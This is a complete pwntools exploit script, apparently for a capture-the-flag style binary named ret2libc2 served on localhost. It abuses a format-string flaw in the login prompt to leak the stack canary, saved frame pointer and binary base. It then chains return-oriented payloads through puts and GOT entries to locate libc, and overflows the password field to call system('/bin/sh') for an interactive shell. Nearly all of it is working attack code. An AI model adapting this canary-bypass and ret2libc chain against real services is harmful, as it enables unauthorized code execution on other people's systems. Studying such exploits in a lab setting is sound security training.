#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 14006 --libc ../../libc.so.6 ../src/ret2libc2.debug
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "../src/ret2libc2.debug")
context.terminal = ['alacritty', '-e']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or "localhost"
port = int(args.PORT or 14006)
libc = ELF("../../libc.so.6")


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
b *vuln+195
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes

username = "n1k0th3gr3@t"
password = "cr1st1n@scks"


def login(io: process | connect, _user: bytes = username.encode('ascii'), _pass: bytes = password.encode('ascii')):
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"name: ")
    io.sendline(_user)
    io.recvuntil(b"word: ")
    io.sendline(_pass)
    io.recvuntil(b".\n")
    return


def view_logs(io: process | connect) -> list[bytes]:
    io.recvuntil(b"> ")
    io.sendline(b"2")

    # getting all logs
    raw = io.recvuntil(b"-- N1k0", drop=True)
    return raw.split(b"\n")

def reap_logs(io: process | connect) -> list[str]:
    logs = view_logs(io)
    logs = logs[1:-1] # removing initial login and junk final entry
    return list(map(lambda x: x.decode('ascii').split("username ")[1].split(", password")[0], logs))

def exit_prog(io: process | connect):
    io.recvuntil(b"> ")
    io.sendline(b"3")


# -- exploit --
io = start()

# real login
login(io)

## fake logins to leak the stack
#for i in range(1, 101, 5):
#    io.info(f"Leaking stack vars {i} to {i + 5}.")
#    payload = ".".join([f"{j}|%{j}$lx" for j in range(i, i +5)])
#    login(io, payload.encode('ascii'))
#
## leaking logs
##logs = list(map(lambda x: x.decode('ascii'), reap_logs(io)))
#logs = reap_logs(io)
#
#for log in logs:
#    io.info(log)

# stack var 65 contains the base address of main
# stack var 43 contains the stack Canary
# stack var 44 contains the rbp
# stack var 45 contains main+341
payload = '.'.join(["%43$lx", "%44$lx", "%45$lx"]) # canary, rbp, main+341
login(io, payload.encode('ascii'))
logs = reap_logs(io)[0].split('.')

# assigning
canary = int(logs[0], 16)
rbp = int(logs[1], 16)
exe.address = int(logs[2], 16) - exe.sym['main'] - 341
assert exe.address & 0xfff == 0x0

# logging
io.success(f"Obtained canary: {hex(canary)}")
io.success(f"Obtained RBP: {hex(rbp)}")
io.success(f"Obtained base address of binary: {hex(exe.address)}")

# ropping
syms = ['puts', 'printf', 'fgets', 'exit', 'strftime']
addrs = {}
for sym in syms:
    # creating the rop
    rop = ROP(exe)
    rop.puts(exe.got[sym])
    rop.main()

    # payload
    payload = b"A" * 0x48
    payload += pack(canary)
    payload += pack(rbp)
    payload += rop.chain()

    # sending ROP
    login(io, _pass=payload)

    # executing rop
    exit_prog(io)

    # leaking address
    addrs[sym] = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b'\0'))
    io.info(f"Leaked address of {sym}@libc {hex(addrs[sym])}")

    # have to log in again
    login(io)

# confirming libc
libc.address = addrs[syms[0]] - libc.sym[syms[0]]
for sym in syms:
    io.debug(f"{sym}@libc: {hex(libc.sym[sym])} == {sym}@leak: {hex(addrs[sym])}")
    assert libc.sym[sym] == addrs[sym]

# spawning a shell
rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

# payload
payload = b"A" * 0x48
payload += pack(canary)
payload += pack(rbp)
payload += rop.chain()

# sending ROP
login(io, _pass=payload)

# executing rop
exit_prog(io)

# enjoy the shell!
io.interactive()

